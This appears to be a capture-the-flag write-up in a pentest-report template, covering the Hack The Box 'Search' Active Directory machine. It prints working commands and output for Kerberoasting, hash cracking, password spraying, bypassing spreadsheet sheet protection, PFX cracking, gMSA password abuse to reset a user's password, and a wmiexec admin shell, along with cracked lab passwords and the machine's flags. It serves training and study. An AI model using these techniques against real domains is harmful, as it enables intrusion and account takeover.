| Not valid after:  2030-04-05T09:05:25
| MD5:   eeb9 303e 6d46 bd8b 34a0 1ed6 0eb8 3287
| SHA-1: 1e06 9fd0 ef45 b051 78b2 c6bf 1bed 975e a87d 0458
| -----BEGIN CERTIFICATE-----
| MIIC7TCCAdWgAwIBAgIQcJlfxrPWrqJOzFjgO04PijANBgkqhkiG9w0BAQsFADAe
| MRwwGgYDVQQDExNXTVN2Yy1TSEEyLVJFU0VBUkNIMB4XDTIwMDQwNzA5MDUyNVoX
| DTMwMDQwNTA5MDUyNVowHjEcMBoGA1UEAxMTV01TdmMtU0hBMi1SRVNFQVJDSDCC
| ASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBALXrSYHlRsq+HX01zrmC6Ddi
| /+vL/iDzS9endY3CRjfTjBL85qwvU5dkS+cxYTIkDaK5M9eoLcaVSARIcyrGIGuq
| DwIFQuYuaoGeQgiaQCqU5vXgsZ/xE8DRmlnZ2DeiAcHhx72TOHoUoUP4q2EqRoVr
| q5RCBGITT7hdRQd0vuTIHoLxdO2U5wZVCoN5vsp0Du43/LCgXExUpcHAHu9aVAzt
| pXWFY8B3XEFZjafffOHXiK6C2UzX4DddYweKR+ItMfQzX8T2MbX1qVm7D526/gU9
| WRGa7F/tj8+qvzZc4SQZ6Td9PWpMKCPGqqYTGmHlEW8ZowGoMSH62QaCilFxckEC
| AwEAAaMnMCUwEwYDVR0lBAwwCgYIKwYBBQUHAwEwDgYDVR0PBAcDBQCwAAAAMA0G
| CSqGSIb3DQEBCwUAA4IBAQAlGUrh9gLK7Er/BzEjyWebPPf18m3XxgZ13iFllhJ0
| 5tBUb3hczHIr3VOj/OWUJygxw8O10OrBZJZf29TPZ2nXKGbJRpYe+baii49LsGjr
| DiOM5XVZv5qiPBNts7fKyhpzTy0DdnIKAXUIYy/7nQ6rHetXApz89ZEzU6vAN0g0
| Zxq/NolqIVnehFn/36tjc65v1wgo6KnHAQUt6zWufueeYS3k2f4JzvFn4aPtUYRi
| nQgTuGbJTlxdVJ5DJjld9pLyJ+OctGeI1jRITiYlu5p3JwhxU0+mQjGT5mQZ+Umu
| abMpffugMOPYnyHu8poRZWjKgNBN0ygmnqGbTjx57No5
|_-----END CERTIFICATE-----
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49693/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49694/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49704/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49719/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
TCP/IP fingerprint:
SCAN(V=7.92%E=4%D=11/10%OT=53%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=636D9FF3%P=x86_64-pc-linux-gnu)
SEQ(SP=100%GCD=2%ISR=10E%TI=I%II=I%SS=S%TS=U)
OPS(O1=M53ANW8NNS%O2=M53ANW8NNS%O3=M53ANW8%O4=M53ANW8NNS%O5=M53ANW8NNS%O6=M53ANNS)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)
ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M53ANW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=256 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: RESEARCH; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| smb2-time: 
|   date: 2022-11-11T01:05:15
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 49396/tcp): CLEAN (Timeout)
|   Check 2 (port 16314/tcp): CLEAN (Timeout)
|   Check 3 (port 21718/udp): CLEAN (Timeout)
|   Check 4 (port 64855/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   163.77 ms 10.10.16.1
2   163.94 ms 10.129.227.156

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:05
Completed NSE at 19:05, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:05
Completed NSE at 19:05, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:05
Completed NSE at 19:05, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 105.78 seconds
           Raw packets sent: 104 (8.284KB) | Rcvd: 52 (2.872KB)
```

_Initial Shell - PowerShell Web Access_

Viewing the landing page on the web server port 80

<figure><img src=".gitbook/assets/image.png" alt=""><figcaption><p>Landing Page</p></figcaption></figure>

Scoping the website I see an interesting image&#x20;

<figure><img src=".gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

Zooming into this image it appears to show names and a password

<figure><img src=".gitbook/assets/image (4).png" alt=""><figcaption><p>Names and Passwords</p></figcaption></figure>

I attempt to use a common naming scheme as the username and the presented password. The credentials were correct and shares were revealed.

```
┌──[Fri Nov 11 11:44:11 AM CST 2022]-[TheScriptKid]-[/home/pentester]
├──[wlan0: 192.168.1.153]-[tun0: 10.10.16.2]-[ip: 10.129.227.156]
└──# cme smb $ip -u 'hope.sharp' -p 'IsolationIsKey?' --shares      
SMB         10.129.227.156  445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
SMB         10.129.227.156  445    RESEARCH         [+] search.htb\hope.sharp:IsolationIsKey? 
SMB         10.129.227.156  445    RESEARCH         [+] Enumerated shares
SMB         10.129.227.156  445    RESEARCH         Share           Permissions     Remark
SMB         10.129.227.156  445    RESEARCH         -----           -----------     ------
SMB         10.129.227.156  445    RESEARCH         ADMIN$                          Remote Admin
SMB         10.129.227.156  445    RESEARCH         C$                              Default share
SMB         10.129.227.156  445    RESEARCH         CertEnroll      READ            Active Directory Certificate Services share
SMB         10.129.227.156  445    RESEARCH         helpdesk                        
SMB         10.129.227.156  445    RESEARCH         IPC$            READ            Remote IPC
SMB         10.129.227.156  445    RESEARCH         NETLOGON        READ            Logon server share 
SMB         10.129.227.156  445    RESEARCH         RedirectedFolders$ READ,WRITE      
SMB         10.129.227.156  445    RESEARCH         SYSVOL          READ            Logon server share
```

With these credentials I receive a ticket by utilizing the impacket tool GetUserSPNs

{% code overflow="wrap" %}
```
┌──[Fri Nov 11 11:56:28 AM CST 2022]-[TheScriptKid]-[/tmp]
├──[wlan0: 192.168.1.153]-[tun0: 10.10.16.2]-[ip: 10.129.227.156]
└──# python3 /usr/local/bin/GetUserSPNs.py search.htb/hope.sharp:'IsolationIsKey?' -dc-ip $ip -request 
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

ServicePrincipalName               Name     MemberOf  PasswordLastSet             LastLogon                   Delegation 
---------------------------------  -------  --------  --------------------------  --------------------------  ----------
RESEARCH/web_svc.search.htb:60001  web_svc            2020-04-09 07:59:11.329031  2022-11-10 22:48:48.982717             



$krb5tgs$23$*web_svc$SEARCH.HTB$search.htb/web_svc*$2dbf6521695c969950df2ee133d844c8$ed48a09645d2d6d59a2772ffb9aac766283b272a740d23e3e3127b652a36b5fe75a83da5f2a539a0ca824882b6b3ec211665daa71d4f03a77c1af5481b101d65f2cf6b505721a4d2ec59c6216374a1888475c6b464749a10ae39c691580469b94b0c470fc208d527b0efa60b60e4fa0802a4953e1a8706e1e7f57e622b48ae9ec05bbbed8fba6b23718fff416734da8421b5cfec080f7d0ed3b36f45b5ed25183e9a41ba088a07857a4ec011086fda8ed49492bc26397017dbea7a69ec3791f3b3b5bab0d1299408d2f43bc965446a43baa9c1d01ceb64bb527a1fced6357b5c658a34675870674a410e16f7211118e9970713e18c89669303c8f345d26824fcf89f87d1b48fb8f47c82dc9b7c9213e5f259c30d5b759add6debed4218dd56fab20900893b21e44d5fb3482c8529b1c92d9b7a6e58768af677af3336b3899c4bf4a536905246f48f4b524c14353cfc6bb5de2a7db725f29866213c3449fdd02d561ab45017b70207d4b4820e40198564c675af77654e360248848137daef01dbe34972f4ad6b45e52d2fed7f9f43f23e059999957efd841e313367ee188f25c33dd5827e7be7627892a21fb0b3cd9d17ac7919c91ca2f8b6b72adfc5fb7e2299a177d61e3e171f6e7369619fb6bbffb592eacd854413e7ed6fb470acc908a69ab6c2f31f1a4d649334d1c72c8b78ddedf691f3e3576dd5d7ce723f38488ebe342653708bce9659c7887e4e63775f989b37f81709e67e617e9db20ca92821cbaabca451981fcc4227f64797d4fdaf91e23c5abd9b931f5146daf783a61f9e76a6cddc196450703c72434daf67c69fce3c953216b050eb93cdc93c67a199470bf3414f5acd5fe20d300ddc29a7a9433ac6548d7e8404ccafb6853cc5af6601f0b08230c176c584492778e5e3fcdb4020e3962e9d4d67fea5fefa611a801bd8e9566ea9a8d995c1ac2c9869c5b444ec7c94fe17b16ce85e3f9594e2df6f665842b0ffe506a2b63fd33b5483ed1f69889aa51610963b995ae824089717f20837ae063bd7b4ee8375fa3ecd0ebc7720d796e2d28254bf383a3d5c89173da1e787b001d1944e12fab3c76f6a0b101f478c9ccb29b0801466e182627b1fc66f1878c4a198c8b9e8f52a2104f38290800209615558d917eebab3a1fb401a6c32db57875d8bda00388fa5a2f107a7d43f24d0bf71abf436f7110fb8560272f13e2db3cff426f267575ca846e9651fc352992ea050d4ef718e796f8eb85131b6b87d9536f35a466cc3d4021e5246ea0e7a1e8d0958cd03a3b6ca76b3660ff8ea3bd3d612fd507c0b81145ac9efd58930573b6dd0a0a167b754e91769496dd7d7bd95a923a8e29655babd54b0c26c78f2d67a228fcff1ce17133a474431d00c45aa29a89022f30ef5444b747b6e49c1e47f72b8534ef24ac01f514d26753872700be492601d4ec3c7c38958c8be73314c1d40ac9a2a35b149888d
```
{% endcode %}

Using hashcat the ticket was cracked

{% code overflow="wrap" %}
```
┌──[Fri Nov 11 12:03:45 PM CST 2022]-[TheScriptKid]-[/tmp]
├──[wlan0: 192.168.1.153]-[tun0: 10.10.16.2]-[ip: 10.129.227.156]
└──# hashcat -d 2 web_svc.txt -m 13100 -a 0 /usr/share/wordlists/rockyou.txt
hashcat (v6.2.5-579-g634b43e62) starting
...
b8560272f13e2db3cff426f267575ca846e9651fc352992ea050d4ef718e796f8eb85131b6b87d9536f35a466cc3d4021e5246ea0e7a1e8d0958cd03a3b6ca76b3660ff8ea3bd3d612fd507c0b81145ac9efd58930573b6dd0a0a167b754e91769496dd7d7bd95a923a8e29655babd54b0c26c78f2d67a228fcff1ce17133a474431d00c45aa29a89022f30ef5444b747b6e49c1e47f72b8534ef24ac01f514d26753872700be492601d4ec3c7c38958c8be73314c1d40ac9a2a35b149888d:@3ONEmillionbaby
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*web_svc$SEARCH.HTB$search.htb/web_svc*...49888d
```
{% endcode %}

I grab domain information with new set of credentials and parse the generated json files for usernames

```
┌──[Fri Nov 11 12:16:46 PM CST 2022]-[TheScriptKid]-[/tmp]
├──[wlan0: 192.168.1.153]-[tun0: 10.10.16.2]-[ip: 10.129.227.156]
└──# bloodhound-python -u 'web_svc' -p '@3ONEmillionbaby'  -d search.htb -ns $ip -c all       
INFO: Found AD domain: search.htb
INFO: Connecting to LDAP server: research.search.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 113 computers
INFO: Connecting to LDAP server: research.search.htb
INFO: Found 107 users
INFO: Found 64 groups
INFO: Found 0 trusts
...
```

{% code overflow="wrap" %}
```
┌──[Fri Nov 11 12:19:51 PM CST 2022]-[TheScriptKid]-[/tmp]
├──[wlan0: 192.168.1.153]-[tun0: 10.10.16.2]-[ip: 10.129.227.156]
└──# cat *_users.json| jq .data[].Properties.name | cut -d '"' -f2 | cut -d "@" -f1 > users.txt
```
{% endcode %}

I proceed to passwordspray against the compiles usernames and see that edgar.jacobs is also using the web\_svc password

```
┌──[Fri Nov 11 12:21:56 PM CST 2022]-[TheScriptKid]-[/tmp]
├──[wlan0: 192.168.1.153]-[tun0: 10.10.16.2]-[ip: 10.129.227.156]
└──# kerbrute passwordspray -d search.htb --dc $ip users.txt '@3ONEmillionbaby'                                                                            1 ⨯

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 11/11/22 - Ronnie Flathers @ropnop

2022/11/11 12:22:40 >  Using KDC(s):
2022/11/11 12:22:40 >  	10.129.227.156:88

2022/11/11 12:22:41 >  [+] VALID LOGIN:	 WEB_SVC@search.htb:@3ONEmillionbaby
2022/11/11 12:22:43 >  [+] VALID LOGIN:	 EDGAR.JACOBS@search.htb:@3ONEmillionbaby
2022/11/11 12:22:44 >  Done! Tested 107 logins (2 successes) in 3.650 seconds
```

With SMB open I proceed to scope edgar's share and find a file of interest in his desktop folder

```
┌──[Fri Nov 11 12:26:13 PM CST 2022]-[TheScriptKid]-[/tmp]
├──[wlan0: 192.168.1.153]-[tun0: 10.10.16.2]-[ip: 10.129.227.156]
└──# smbclient //$ip/RedirectedFolders$ -U edgar.jacobs                                                                                                    1 ⨯
Password for [WORKGROUP\edgar.jacobs]:
Try "help" to get a list of possible commands.
smb: \> ls
  ...
  edgar.jacobs                       Dc        0  Thu Apr  9 15:04:11 2020
  ...

		3246079 blocks of size 4096. 672051 blocks available
smb: \> cd edgar.jacobs
smb: \edgar.jacobs\> ls
  .                                  Dc        0  Thu Apr  9 15:04:11 2020
  ..                                 Dc        0  Thu Apr  9 15:04:11 2020
  Desktop                           DRc        0  Mon Aug 10 05:02:16 2020
  Documents                         DRc        0  Mon Aug 10 05:02:17 2020
  Downloads                         DRc        0  Mon Aug 10 05:02:17 2020

		3246079 blocks of size 4096. 672051 blocks available
smb: \edgar.jacobs\> cd Desktop
smb: \edgar.jacobs\Desktop\> ls
  .                                 DRc        0  Mon Aug 10 05:02:16 2020
  ..                                DRc        0  Mon Aug 10 05:02:16 2020
  $RECYCLE.BIN                     DHSc        0  Thu Apr  9 15:05:29 2020
  desktop.ini                      AHSc      282  Mon Aug 10 05:02:16 2020
  Microsoft Edge.lnk                 Ac     1450  Thu Apr  9 15:05:03 2020
  Phishing_Attempt.xlsx              Ac    23130  Mon Aug 10 05:35:44 2020

		3246079 blocks of size 4096. 672051 blocks available
smb: \edgar.jacobs\Desktop\> get Phishing_Attempt.xlsx
getting file \edgar.jacobs\Desktop\Phishing_Attempt.xlsx of size 23130 as Phishing_Attempt.xlsx (13.9 KiloBytes/sec) (average 13.9 KiloBytes/sec)
```

Opening the file with libreoffice I can see there is a password protected sheet that can be easily bypassed.

<figure><img src=".gitbook/assets/image (15).png" alt=""><figcaption><p>Password Icon and hidden C column</p></figcaption></figure>

Unzipping the xlsx file allows me to view the password protected sheet's xml markup and to remove the sheetprotection tag using any text editor.&#x20;

```
┌──[Fri Nov 11 12:33:41 PM CST 2022]-[TheScriptKid]-[/tmp/sheet]
├──[wlan0: 192.168.1.153]-[tun0: 10.10.16.2]-[ip: 10.129.227.156]
└──# unzip Phishing_Attempt.xlsx        
Archive:  Phishing_Attempt.xlsx
  inflating: [Content_Types].xml     
  inflating: _rels/.rels             
  inflating: xl/workbook.xml         
  inflating: xl/_rels/workbook.xml.rels  
  inflating: xl/worksheets/sheet1.xml  
  inflating: xl/worksheets/sheet2.xml  
  inflating: xl/theme/theme1.xml     
  inflating: xl/styles.xml           
  inflating: xl/sharedStrings.xml    
  inflating: xl/drawings/drawing1.xml  
  inflating: xl/charts/chart1.xml    
  inflating: xl/charts/style1.xml    
  inflating: xl/charts/colors1.xml   
  inflating: xl/worksheets/_rels/sheet1.xml.rels  
  inflating: xl/worksheets/_rels/sheet2.xml.rels  
  inflating: xl/drawings/_rels/drawing1.xml.rels  
  inflating: xl/charts/_rels/chart1.xml.rels  
  inflating: xl/printerSettings/printerSettings1.bin  
  inflating: xl/printerSettings/printerSettings2.bin  
  inflating: xl/calcChain.xml        
  inflating: docProps/core.xml       
  inflating: docProps/app.xml        
                                                                                                                                                               
┌──[Fri Nov 11 12:33:49 PM CST 2022]-[TheScriptKid]-[/tmp/sheet]
├──[wlan0: 192.168.1.153]-[tun0: 10.10.16.2]-[ip: 10.129.227.156]
└──# vim xl/worksheets/sheet2.xml 
```

{% code overflow="wrap" %}
```
<sheetProtection algorithmName="SHA-512" hashValue="hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg==" saltValue="U9oZfaVCkz5jWdhs9AA8nA==" spinCount="100000" sheet="1" objects="1" scenarios="1"/>
```
{% endcode %}

```
┌──[Fri Nov 11 12:40:57 PM CST 2022]-[TheScriptKid]-[/tmp/sheet]
├──[wlan0: 192.168.1.153]-[tun0: 10.10.16.2]-[ip: 10.129.227.156]
└──# rm Phishing_Attempt.xlsx 
                                                                                                           
┌──[Fri Nov 11 12:45:35 PM CST 2022]-[TheScriptKid]-[/tmp/sheet]
├──[wlan0: 192.168.1.153]-[tun0: 10.10.16.2]-[ip: 10.129.227.156]
└──# zip -fr Phishing_Attempt.xlsx *                                                                                                                      12 ⨯
freshening: xl/worksheets/sheet2.xml (deflated 73%)
```

Reopening the file shows the hidden column in the sheet revealing passwords

<figure><img src=".gitbook/assets/image (9).png" alt=""><figcaption><p>Unprotected Sheet</p></figcaption></figure>

```
┌──[Fri Nov 11 12:50:44 PM CST 2022]-[TheScriptKid]-[/tmp]
├──[wlan0: 192.168.1.153]-[tun0: 10.10.16.2]-[ip: 10.129.227.156]
└──# cme smb $ip -u users.txt -p passwords.txt
...
SMB         10.129.227.156  445    RESEARCH         [+] search.htb\SIERRA.FRYE:$$49=wide=STRAIGHT=jordan=28$$18
```

Using this information I begin to search for valid credentials and see that user sierra.frye is valid

I login as sierra.frye and being to search for files. Finding two files of interest I download the files.

```
┌──[Fri Nov 11 12:55:41 PM CST 2022]-[TheScriptKid]-[/tmp]
├──[wlan0: 192.168.1.153]-[tun0: 10.10.16.2]-[ip: 10.129.227.156]
└──# smbclient //$ip/RedirectedFolders$ -U sierra.frye 
Password for [WORKGROUP\sierra.frye]:
Try "help" to get a list of possible commands.
smb: \> cd sierra.frye
smb: \sierra.frye\> ls
  .                                  Dc        0  Wed Nov 17 19:01:46 2021
  ..                                 Dc        0  Wed Nov 17 19:01:46 2021
  Desktop                           DRc        0  Wed Nov 17 19:08:00 2021
  Documents                         DRc        0  Fri Jul 31 09:42:19 2020
  Downloads                         DRc        0  Fri Jul 31 09:45:36 2020
  user.txt                          ARc       34  Thu Nov 10 18:59:48 2022

		3246079 blocks of size 4096. 671885 blocks available
smb: \sierra.frye\> get user.txt
getting file \sierra.frye\user.txt of size 34 as user.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \sierra.frye\> cd downloads
smb: \sierra.frye\downloads\> ls
  .                                 DRc        0  Fri Jul 31 09:45:36 2020
  ..                                DRc        0  Fri Jul 31 09:45:36 2020
  $RECYCLE.BIN                     DHSc        0  Tue Apr  7 13:04:01 2020
  Backups                           DHc        0  Mon Aug 10 15:39:17 2020
  desktop.ini                      AHSc      282  Fri Jul 31 09:42:18 2020

		3246079 blocks of size 4096. 671885 blocks available
smb: \sierra.frye\downloads\> cd backups
smb: \sierra.frye\downloads\backups\> ls
  .                                 DHc        0  Mon Aug 10 15:39:17 2020
  ..                                DHc        0  Mon Aug 10 15:39:17 2020
  search-RESEARCH-CA.p12             Ac     2643  Fri Jul 31 10:04:11 2020
  staff.pfx                          Ac     4326  Mon Aug 10 15:39:17 2020

		3246079 blocks of size 4096. 671885 blocks available
smb: \sierra.frye\downloads\backups\> get staff.pfx
getting file \sierra.frye\downloads\backups\staff.pfx of size 4326 as staff.pfx (10.6 KiloBytes/sec) (average 5.4 KiloBytes/sec)
```

The staff.pfx file appears to be a password protected certificate

<figure><img src=".gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

Using a tool called crackpks12 I begin to bruteforce and crack the password

```
┌──[Fri Nov 11 01:07:04 PM CST 2022]-[TheScriptKid]-[/root]
├──[wlan0: 192.168.1.153]-[tun0: 10.10.16.2]-[ip: 10.129.227.156]
└──# crackpkcs12 /tmp/staff.pfx -d /usr/share/wordlists/rockyou.txt                                                                                      100 ⨯

Dictionary attack - Starting 8 threads

*********************************************************
Dictionary attack - Thread 1 - Password found: misspissy
*********************************************************


```

Certificate files are commonly used for web servers. I begin to enumerate directories to see where can I use the certificate and notice a staff directory

```
┌──[Fri Nov 11 01:36:59 PM CST 2022]-[TheScriptKid]-[/home/pentester]
├──[wlan0: 192.168.1.153]-[tun0: 10.10.16.2]-[ip: 10.129.227.156]
└──# ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -u http://$ip/FUZZ/ -fc 404                    130 ⨯ 1 ⚙

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.227.156/FUZZ/
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response status: 404
________________________________________________

css                     [Status: 403, Size: 1233, Words: 73, Lines: 30, Duration: 163ms]
images                  [Status: 403, Size: 1233, Words: 73, Lines: 30, Duration: 163ms]
js                      [Status: 403, Size: 1233, Words: 73, Lines: 30, Duration: 334ms]
fonts                   [Status: 403, Size: 1233, Words: 73, Lines: 30, Duration: 56ms]
staff                   [Status: 403, Size: 1233, Words: 73, Lines: 30, Duration: 59ms]
```

<figure><img src=".gitbook/assets/image (8).png" alt=""><figcaption><p>Selecting the certificate</p></figcaption></figure>

I view the staff directory and select the certificate which brings me to a Windows PowerShell Web Access login page

<figure><img src=".gitbook/assets/image (17).png" alt=""><figcaption><p>Windows PowerShell Web Access</p></figcaption></figure>

I use sierra's credentials and specify localhost to login and gain access

<figure><img src=".gitbook/assets/image (3).png" alt=""><figcaption><p>Logging In</p></figcaption></figure>

<figure><img src=".gitbook/assets/image (10).png" alt=""><figcaption><p>Inital Foothold</p></figcaption></figure>

**Vulnerability Explanation:**

**Vulnerability Fix:**

**Severity: Critical**

**Proof of Concept Code Here:**

**Local.txt Proof Screenshot**

<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

**Local.txt Contents**

```
PS C:\users\sierra.frye\desktop> 
hostname; whoami; type user.txt; ipconfig /all
 
Windows IP Configuration
 
   Host Name . . . . . . . . . . . . : Research
   Primary Dns Suffix  . . . . . . . : search.htb
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : search.htb
                                       htb
 
Ethernet adapter Ethernet0 2:
 
   Connection-specific DNS Suffix  . : .htb
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
   Physical Address. . . . . . . . . : 00-50-56-B9-4E-F1
   DHCP Enabled. . . . . . . . . . . : Yes
   Autoconfiguration Enabled . . . . : Yes
   IPv6 Address. . . . . . . . . . . : dead:beef::ce(Preferred) 
   Lease Obtained. . . . . . . . . . : 11 November 2022 00:58:49
   Lease Expires . . . . . . . . . . : 11 November 2022 20:58:50
   IPv6 Address. . . . . . . . . . . : dead:beef::e5e3:b96e:4a37:5a02(Preferred) 
   Link-local IPv6 Address . . . . . : fe80::e5e3:b96e:4a37:5a02%6(Preferred) 
   IPv4 Address. . . . . . . . . . . : 10.129.227.156(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Lease Obtained. . . . . . . . . . : 11 November 2022 00:58:32
   Lease Expires . . . . . . . . . . : 11 November 2022 20:59:11
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:2bb5%6
                                       10.129.0.1
   DHCP Server . . . . . . . . . . . : 10.129.0.1
   DHCPv6 IAID . . . . . . . . . . . : 117461078
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-29-24-23-32-00-50-56-B9-CF-AF
   DNS Servers . . . . . . . . . . . : 127.0.0.1
   NetBIOS over Tcpip. . . . . . . . : Enabled
   Connection-specific DNS Suffix Search List :
                                       htb
PS C:\users\sierra.frye\desktop>
```

```
Research
search\sierra.frye
PS C:\users\sierra.frye\desktop> 
whoami
search\sierra.frye
search\sierra.frye
```

```
cat user.txt
e3a4149a6c84118bcc4085fe8facc5b0
search\sierra.frye
PS C:\users\sierra.frye\desktop> 
```

**Privilege Escalation**

With our previous information found with bloodhound sierra.fry has readgmsapassword which can be easily abused by the following

```
PS C:\users\sierra.frye\desktop> 
$gmsa = Get-ADServiceAccount -Identity bir-adfs-gmsa -Properties 'msds-managedpassword'
$mp = $gmsa.'msds-managedpassword'
$mp1 = ConvertFrom-ADManagedPasswordBlob $mp 
$user = 'BIR-ADFS-GMSA$' 
$passwd = $mp1.'CurrentPassword'
$secpass = ConvertTo-SecureString $passwd -AsPlainText -Force
$cred = new-object system.management.automation.PSCredential $user,$secpass
Invoke-Command -computername 127.0.0.1 -ScriptBlock {Set-ADAccountPassword -Identity tristan.davies -reset -NewPassword
 (ConvertTo-SecureString -AsPlainText 'Password1234!' -force)} -Credential $cred
search\sierra.frye
PS C:\users\sierra.frye\desktop>
```

Using wmiexec we gain administrative access

```
┌──[Fri Nov 11 02:38:33 PM CST 2022]-[TheScriptKid]-[/root]
├──[wlan0: 192.168.1.153]-[tun0: 10.10.16.2]-[ip: 10.129.227.156]
└──# wmiexec.py search/tristan.davies:'Password1234!'@$ip                                                                                                  1 ⨯
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>
```

**Vulnerability Exploited:**

**Vulnerability Explanation:**

**Vulnerability Fix:**

**Severity: Critical**

**Exploit Code:**

**root Screenshot Here**

<figure><img src=".gitbook/assets/image (7).png" alt=""><figcaption><p>Root.txt</p></figcaption></figure>

**root.txt Contents**

```
C:\users\administrator\desktop>hostname
Research

C:\users\administrator\desktop>whoami
search\tristan.davies

C:\users\administrator\desktop>type root.txt
d2fb84163f6279e4cba7cd697bc00992

C:\users\administrator\desktop>ipconfig /all

Windows IP Configuration

   Host Name . . . . . . . . . . . . : Research
   Primary Dns Suffix  . . . . . . . : search.htb
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : search.htb
                                       htb

Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : .htb
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
   Physical Address. . . . . . . . . : 00-50-56-B9-4E-F1
   DHCP Enabled. . . . . . . . . . . : Yes
   Autoconfiguration Enabled . . . . : Yes
   IPv6 Address. . . . . . . . . . . : dead:beef::ce(Preferred) 
   Lease Obtained. . . . . . . . . . : 11 November 2022 00:58:49
   Lease Expires . . . . . . . . . . : 11 November 2022 21:28:50
   IPv6 Address. . . . . . . . . . . : dead:beef::e5e3:b96e:4a37:5a02(Preferred) 
   Link-local IPv6 Address . . . . . : fe80::e5e3:b96e:4a37:5a02%6(Preferred) 
   IPv4 Address. . . . . . . . . . . : 10.129.227.156(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Lease Obtained. . . . . . . . . . : 11 November 2022 00:58:32
   Lease Expires . . . . . . . . . . : 11 November 2022 21:29:12
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:2bb5%6
                                       10.129.0.1
   DHCP Server . . . . . . . . . . . : 10.129.0.1
   DHCPv6 IAID . . . . . . . . . . . : 117461078
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-29-24-23-32-00-50-56-B9-CF-AF
   DNS Servers . . . . . . . . . . . : 127.0.0.1
   NetBIOS over Tcpip. . . . . . . . : Enabled
   Connection-specific DNS Suffix Search List :
                                       htb

C:\users\administrator\desktop>
```

#### Badge

<figure><img src=".gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

**Post Exploitation**

### Maintaining Access

Maintaining access to a system is important to us as attackers, ensuring that we can get back into a system after it has been exploited is invaluable. The maintaining access phase of the penetration test focuses on ensuring that once the focused attack has occurred (i.e. a buffer overflow), we have administrative access over the system again. Many exploits may only be exploitable once and we may never be able to get back into a system after we have already performed the exploit.

### House Cleaning
